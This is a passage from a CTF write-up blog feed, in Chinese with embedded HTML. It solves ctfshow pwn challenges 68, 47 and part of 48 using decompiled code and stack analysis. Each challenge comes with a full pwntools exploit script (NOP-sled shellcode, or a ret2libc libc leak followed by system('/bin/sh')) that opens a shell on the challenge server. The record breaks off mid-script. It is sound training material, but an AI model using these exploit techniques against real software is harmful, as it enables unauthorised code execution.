operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28112</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"The current location: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>addr<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"addr:\"</span><span class=\"token punctuation\">,</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x90'</span><span class=\"token operator\">*</span><span class=\"token number\">1136</span><span class=\"token operator\">+</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>addr<span class=\"token operator\">+</span><span class=\"token number\">668</span><span class=\"token operator\">+</span><span class=\"token number\">0x2d</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>参考：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MjYzNTE3MC9hcnRpY2xlL2RldGFpbHMvMTMxOTg1NTE4\">https://blog.csdn.net/weixin_52635170/article/details/131985518</span></p>\n<h1 id=\"pwn6864位sled-shellcode\"><a class=\"anchor\" href=\"#pwn6864位sled-shellcode\">#</a> pwn68（64 位 sled -&gt;shellcode）</h1>\n<h2 id=\"题目描述\"><a class=\"anchor\" href=\"#题目描述\">#</a> 题目描述：</h2>\n<p>题目描述： <code>64bit nop sled</code></p>\n<p>64 位程序</p>\n<pre><code>Arch:     amd64-64-little\nRELRO:    Partial RELRO\nStack:    Canary found\nNX:       NX disabled\nPIE:      No PIE (0x400000)\nRWX:      Has RWX segments\n</code></pre>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>v3<span class=\"token punctuation\">;</span> <span class=\"token comment\">// rax</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+8h] [rbp-1018h] BYREF</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">char</span> seed<span class=\"token punctuation\">[</span><span class=\"token number\">4104</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+10h] [rbp-1010h] BYREF</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> __int64 v7<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+1018h] [rbp-8h]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  v7 <span class=\"token operator\">=</span> <span class=\"token function\">__readfsqword</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x28u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">setbuf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0LL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token function\">logo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  <span class=\"token function\">srand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span>seed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token function\">Loading</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token function\">acquire_satellites</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>  v3 <span class=\"token operator\">=</span> <span class=\"token function\">query_position</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"We need to load the ctfshow_flag.\\nThe current location: %p\\n\"</span><span class=\"token punctuation\">,</span> v3<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"What will you do?\\n> \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  <span class=\"token function\">fgets</span><span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">,</span> <span class=\"token number\">4096</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">stdin</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Where do you start?\\n> \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token function\">__isoc99_scanf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"%p\"</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>v5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>  <span class=\"token function\">v5</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token function\">query_position</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">char</span> v1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Bh] [rbp-15h] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> v2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// [rsp+Ch] [rbp-14h]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  v2 <span class=\"token operator\">=</span> <span class=\"token function\">rand</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> <span class=\"token number\">1337</span> <span class=\"token operator\">-</span> <span class=\"token number\">668</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token operator\">&amp;</span>v1 <span class=\"token operator\">+</span> v2<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>与上一题基本相同，只是这次变成了 64 位了，所以一个字就变成了 8 字节</p>\n<p>根据汇编，一直到 <code>call query_position</code>  计算栈的情况</p>\n<p>函数栈的位置：esp=esp-8-0x1020</p>\n<p>然后 seed 在 rbp-0x1010 处，v5 在 rbp-0x1018 处</p>\n<p>可以得出结构：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/Q%7D%7BFV%5BXL%7EDZ%402GF5Y6M_4GU.png\" alt=\"\" /></p>\n<p>得到的地址是 v1 地址 + 一个随机数（-668~668），我们所要填充的 shellcode 的地址要绕过这些随机的可能地址，所以要选择一个最高的地址（）</p>\n<p>x=v1+random;<br />\nseed=v1+0x35；<br />\n <code>seed=x-random+0x35</code> 【这里取 seed 的最大地址，因为要执行的 seed 被假设为可能范围内最大的地址，这样 shelldode 一定在外部】</p>\n<p>所以 seed 可能的取值为 <code>seed =x-668+0x35</code>  到 <code>seed=x+668+0x35</code> , 所以要跨越这个区间（1336 保障了一定能越过 seed 的最大地址），在区间外部的地址输入 shellcode 就行（需要利用 <code>nop</code>  来 sled）</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">#context.log_level = 'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28205</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>shellcode <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"The current location: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>addr<span class=\"token operator\">=</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">14</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"addr:\"</span><span class=\"token punctuation\">,</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x90'</span><span class=\"token operator\">*</span><span class=\"token number\">1336</span><span class=\"token operator\">+</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"> \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>addr<span class=\"token operator\">+</span><span class=\"token number\">668</span><span class=\"token operator\">+</span><span class=\"token number\">0x35</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure>",
            "tags": [
                "pwn"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/10/14/pwn/%E5%88%B7%E9%A2%98/ctfshow/47-57/",
            "url": "https://vvwwvv.cn/2023/10/14/pwn/%E5%88%B7%E9%A2%98/ctfshow/47-57/",
            "title": "CTFshow(栈溢出部分,47~57)",
            "date_published": "2023-10-14T03:01:15.000Z",
            "content_html": "<h1 id=\"pwn47ret2libc\"><a class=\"anchor\" href=\"#pwn47ret2libc\">#</a> pwn47（ret2libc）</h1>\n<h2 id=\"题目\"><a class=\"anchor\" href=\"#题目\">#</a> 题目：</h2>\n<p><code>ez ret2libc</code></p>\n<p>32 位程序保护只有 <code>Partial RELRO</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">char</span> s<span class=\"token punctuation\">[</span><span class=\"token number\">152</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Ch] [ebp-9Ch] BYREF</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Start your show time: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">gets</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>有 gets 函数，然后也执行了 puts，可以进行泄露得到 libc 基址</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p=process('./')</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn47'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28252</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>puts_got<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>puts_plt<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>main_add<span class=\"token operator\">=</span>e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">\"main\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#system=e.sym[\"system\"]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#rdi_ret=0x00000000004007f3</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>payload<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x9c</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main_add<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Start your show time: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token comment\">#puts=u64(p.recv(6).ljust(8,b'\\x00'))</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>puts<span class=\"token operator\">=</span>u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">,</span>puts<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>libc_base<span class=\"token operator\">=</span>puts<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>system<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>binsh<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">\"str_bin_sh\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Start your show time: \"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>payload2<span class=\"token operator\">=</span><span class=\"token string\">b\"a\"</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x9c</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>system<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>main_add<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p32<span class=\"token punctuation\">(</span>binsh<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"pwn48-ret2libc\"><a class=\"anchor\" href=\"#pwn48-ret2libc\">#</a> pwn48 (ret2libc)</h1>\n<h2 id=\"题目-2\"><a class=\"anchor\" href=\"#题目-2\">#</a> 题目：</h2>\n<p><code>没有write了，试试用puts吧，更简单了呢</code></p>\n<p>32 位程序，只开启了 <code>partial RELRO</code></p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> __cdecl <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>envp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">init</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>argc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">logo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">puts</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"O.o?\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token class-name\">ssize_t</span> <span class=\"token function\">ctfshow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">103</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [esp+Dh] [ebp-6Bh] BYREF</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token function\">read</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">,</span> <span class=\"token number\">0xC8u</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>和上一题类似，泄露得到 libc 基址</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span> arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#p=process('./')</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./pwn48'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#p=remote('node4.buuoj.cn',28249)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p<span class=\"token operator\">=</span>remote<span class=\"token punctuation\">(</span><span class=\"token string\">\"pwn.challenge.ctf.show\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">28262</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td 